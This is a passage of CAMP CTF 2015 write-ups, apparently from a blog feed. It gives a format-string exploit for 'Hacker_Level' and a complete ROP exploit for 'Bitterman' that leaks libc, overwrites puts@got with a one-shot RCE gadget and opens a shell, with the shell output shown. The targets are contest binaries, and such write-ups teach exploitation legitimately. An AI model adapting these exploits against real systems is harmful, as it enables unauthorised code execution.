</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/cat flag.txt       <span class="p">;</span> <span class="c">#e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb</span>
</span><span class='line'>CAMP15_82da7965eb0a3ee1fb4d5d0d8804cc409ad04a4f5e06be2f2bbdbf1c0cd638a7
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Hacker_Level]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-hacker-level/"/>
    <updated>2015-08-18T21:34:00+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-hacker-level</id>
    <content type="html"><![CDATA[<p>Easy 200 points.</p>

<!--more-->


<p>We&rsquo;re given a binary and the source. We need to supply a name that will be processed into an integer. The resulting integer should be <code>0xCCC31337</code>. If you look at the function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kt">uint32_t</span> <span class="n">level</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="n">calc_level</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="n">p</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">level</span> <span class="o">*=</span> <span class="mi">257</span><span class="p">;</span>
</span><span class='line'>      <span class="n">level</span> <span class="o">^=</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">level</span> <span class="o">%=</span> <span class="mh">0xcafe</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finally, the value for <code>level</code> is modulo&rsquo;d with <code>0xcafe</code>. This means that <code>level</code> can <em>never</em> be the required value <code>0xCCC31337</code>. We&rsquo;ll need to co-opt another section of code to pass the check. This quickly came to mind:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;What&#39;s your name? &quot;</span><span class="p">);</span>
</span><span class='line'><span class="n">fgets</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">name</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">calc_level</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">usleep</span><span class="p">(</span><span class="mi">150000</span><span class="p">);</span>
</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello, &quot;</span><span class="p">);</span>
</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Excellent. We have a format string vulnerability. After hex-editing the binary to get rid of the <code>usleep()</code> calls, I bruteforced the location of our format string on the stack (starts at position 7). Next, the disassembly of <code>hacker-level</code> shows us where <code>level</code> is at in memory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'> <span class="mi">8048620</span><span class="o">:</span>    <span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="nl">ds</span><span class="p">:</span><span class="mh">0x804a04c</span><span class="p">,</span><span class="mh">0xccc31337</span>
</span></code></pre></td></tr></table></div></figure>


<p>All I needed to do was to write the correct format string. I came up with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804a04c</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804a04e</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%4911c</span><span class="s">%7$hn</span><span class="si">%47500c</span><span class="s">%8$hn&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running this against the remote binary using <code>nc</code> gave <code>The flag is: CAMP15_337deec05ccc63b1168ba3379ae4d65854132604</code>. Done!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Bitterman &amp; Phobos]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-bitterman-and-phobos/"/>
    <updated>2015-08-18T21:32:18+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-bitterman-and-phobos</id>
    <content type="html"><![CDATA[<p>I rolled into the CampCTF while Swappage was already working on it. He had started on bitterman, a 400 point challenge.</p>

<!--more-->


<p>We&rsquo;re given a 64-bit ELF binary and Swappage also managed to obtain the corresponding libc. Upon starting the binary, we&rsquo;re presented with the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt; What<span class="err">&#39;</span>s your name?
</span><span class='line'>BBBB
</span><span class='line'>Hi, BBBB
</span><span class='line'>x
</span><span class='line'>&gt; Please input the length of your message:
</span><span class='line'>-1
</span><span class='line'>&gt; Please enter your text:
</span><span class='line'>LSJFLSDJF
</span><span class='line'>&gt; Thanks!
</span></code></pre></td></tr></table></div></figure>


<p>The <code>x</code> after the <code>BBBB</code> in the above example was actually <code>0x7f</code>, so the binary is leaking part of an address (we later determined it to be a stack address). In the end, I couldn&rsquo;t make use of this, but it was interesting to see. Swappage already found the bugs: we can send a large message length and this will allow us to overflow a stack buffer. NX is enabled so it&rsquo;s ROP time!</p>

<p>Besides NX, ASLR is also enabled. This means we have to first leak a libc address to calculate libc&rsquo;s base address and then something like <code>system()</code>. I made use of the <code>puts@plt</code> to write out the contents of <code>puts@got</code>. The latter contains the libc address of <code>puts()</code>, which we can then receive. Superkojiman was able to find the one-shot RCE gadget. The ROP chain goes to <code>read@plt</code> and awaits our input. Upon receiving the address of the one-shot RCE gadget in libc, the ROP chain overwrites <code>puts@got</code> and restarts the binary from <code>main()</code>. This latter decision was based on using <code>system()</code> instead of the one-shot RCE gadget, but by the time I was done implementing the ROP chain, superkojiman had already supplied the offset. When <code>main()</code> restarts, one of the first functions it calls is <code>puts@plt</code>, which is now pointing to the shell-spawning one-shot RCE gadget. We land a shell and are happy!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">q</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">152</span>   <span class="c"># ty Swappage!</span>
</span><span class='line'>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">0x000002bc : pop r12; pop r13; pop r14; pop r15; ret</span>
</span><span class='line'><span class="sd">0x00000296 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]</span>
</span><span class='line'><span class="sd">0x00000060 : pop rbp; ret</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">base</span> <span class="o">=</span> <span class="mh">0x400590</span>
</span><span class='line'><span class="c"># prologue, needed for later! after the [call r12 + rbx*8], there is</span>
</span><span class='line'><span class="c"># a cmp rbx, rbp. At this point, rbx is 1 and if rbp is not equal to rbx, </span>
</span><span class='line'><span class="c"># the code jumps back instead of leading to a ret!</span>
</span><span class='line'><span class="c"># therefore, we set up rbp first. </span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x00000060</span><span class="o">+</span><span class="n">base</span><span class="p">)</span>    <span class="c"># pop rbp ; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>    <span class="c"># value for rbp</span>
</span><span class='line'>
</span><span class='line'><span class="c"># first, we set up some registers, which will later be put in the correct registers</span>
</span><span class='line'><span class="c"># puts() uses rdi as argument</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x000002bc</span><span class="o">+</span><span class="n">base</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x600c50</span><span class="p">)</span>  <span class="c"># value for r12 -&gt; puts@got</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>         <span class="c"># value for r13 -&gt; goes into rdx </span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># value for r14 -&gt; goes into rsi</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x600c50</span><span class="p">)</span>  <span class="c"># value for r15 -&gt; goes into rdi -&gt; leak addr of puts()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># swap around the registers and call puts()</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x00000296</span><span class="o">+</span><span class="n">base</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">7</span>
</span><span class='line'><span class="c"># without this, we don&#39;t get output</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x400570</span><span class="p">)</span>  <span class="c"># fflush@plt</span>
</span><span class='line'>
</span><span class='line'><span class="c"># now read() to overwrite printf()</span>
</span><span class='line'><span class="c"># read() is blocking and will wait for our input :)</span>
</span><span class='line'><span class="c"># again, first set up rbp</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x00000060</span><span class="o">+</span><span class="n">base</span><span class="p">)</span>    <span class="c"># pop rbp ; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>    <span class="c"># value for rbp</span>
</span><span class='line'>
</span><span class='line'><span class="c"># set up registers/arguments for read()</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x000002bc</span><span class="o">+</span><span class="n">base</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x600c60</span><span class="p">)</span>  <span class="c"># value for r12 -&gt; read@got</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>         <span class="c"># value for r13 -&gt; goes into rdx -&gt; count</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x600c50</span><span class="p">)</span> <span class="c"># value for r14 -&gt; goes into rsi -&gt; overwrite puts@got</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>         <span class="c"># value for r15 -&gt; goes into rdi -&gt; 0 -&gt; stdin</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x00000296</span><span class="o">+</span><span class="n">base</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">7</span>
</span><span class='line'>
</span><span class='line'><span class="c"># restart main(), so the binary will execute puts() -&gt; one shot rce, lands a shell</span>
</span><span class='line'><span class="c"># could&#39;ve just a easily return to puts@plt...</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x4006ec</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;challs.campctf.ccc.ac&#39;</span><span class="p">,</span> <span class="mi">10103</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;a</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;message:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;-1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>   <span class="c"># ty Swappage!</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;text:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Thanks!</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x00\x00</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="n">puts_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] Leaked puts(): &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="mh">0x70a30</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] libc base addr: &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
</span><span class='line'>  <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x442AA</span> <span class="c"># one shot rce, ty superkojiman!</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] sending one shot rce addr (&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;)&quot;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># the rop chain will wait at read(), because that is blocking</span>
</span><span class='line'>  <span class="c"># send the address to overwrite puts@got</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">q</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The reason for setting up <code>rbp</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>  <span class="mi">400839</span><span class="p">:</span>   <span class="n">call</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r12</span><span class="o">+</span><span class="n">rbx</span><span class="o">*</span><span class="mi">8</span><span class="p">]</span>
</span><span class='line'>  <span class="mi">40083</span><span class="n">d</span><span class="p">:</span>   <span class="n">add</span>    <span class="n">rbx</span><span class="p">,</span><span class="mh">0x1</span>
</span><span class='line'>  <span class="mi">400841</span><span class="p">:</span>  <span class="nb">cmp</span>    <span class="n">rbx</span><span class="p">,</span><span class="n">rbp</span>  <span class="p">;</span> <span class="k">if</span> <span class="n">rbx</span> <span class="o">!=</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">we</span> <span class="n">jump</span> <span class="n">back</span><span class="err">!</span>
</span><span class='line'>  <span class="mi">400844</span><span class="p">:</span>  <span class="n">jne</span>    <span class="mi">400830</span>
</span><span class='line'>  <span class="mi">400846</span><span class="p">:</span>  <span class="n">add</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x8</span>  <span class="p">;</span> <span class="n">we</span> <span class="n">wanna</span> <span class="n">go</span> <span class="n">here</span><span class="err">!</span>
</span><span class='line'>  <span class="mi">40084</span><span class="n">a</span><span class="p">:</span>   <span class="n">pop</span>    <span class="n">rbx</span>
</span><span class='line'>  <span class="mi">40084</span><span class="n">b</span><span class="p">:</span>   <span class="n">pop</span>    <span class="n">rbp</span>
</span><span class='line'>  <span class="mi">40084</span><span class="n">c</span><span class="p">:</span>   <span class="n">pop</span>    <span class="n">r12</span>
</span><span class='line'>  <span class="mi">40084</span><span class="n">e</span><span class="p">:</span>   <span class="n">pop</span>    <span class="n">r13</span>
</span><span class='line'>  <span class="mi">400850</span><span class="p">:</span>  <span class="n">pop</span>    <span class="n">r14</span>
</span><span class='line'>  <span class="mi">400852</span><span class="p">:</span>  <span class="n">pop</span>    <span class="n">r15</span>
</span><span class='line'>  <span class="mi">400854</span><span class="p">:</span>  <span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the exploit in action:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>+<span class="o">]</span> Leaked puts<span class="o">()</span>: 0x7fb9d6487a30
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc base addr: 0x7fb9d6417000
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> sending one shot rce addr <span class="o">(</span>0x7fb9d645b2aa<span class="o">)</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>challenge<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>challenge<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>challenge<span class="o">)</span>
</span><span class='line'>whoami
</span><span class='line'>challenge
</span><span class='line'>ls -alh
</span><span class='line'>total 40K
</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root 4.0K Aug <span class="m">13</span> 13:46 .
</span><span class='line'>drwxr-xr-x <span class="m">3</span> root root 4.0K Aug  <span class="m">5</span> 21:43 ..
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root  <span class="m">220</span> Aug  <span class="m">5</span> 19:55 .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root 3.7K Aug  <span class="m">5</span> 19:55 .bashrc
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root  <span class="m">675</span> Aug  <span class="m">5</span> 19:55 .profile
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> root root  11K Aug <span class="m">12</span> 01:28 bitterman
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root   <span class="m">43</span> Aug <span class="m">13</span> 13:47 flag.txt
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> root root   <span class="m">64</span> Aug <span class="m">12</span> 01:34 run.sh
</span><span class='line'>cat flag.txt
</span><span class='line'>CAMP15_a786be6aca70bfd19b6af86133991f80  -
</span></code></pre></td></tr></table></div></figure>


<h2>Phobos</h2>

<p>Next, we turned to phobos for 300 points, which is nearly the same binary but without NX! After a few small changes to the previous exploit, we obtained the flag for phobos as well:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
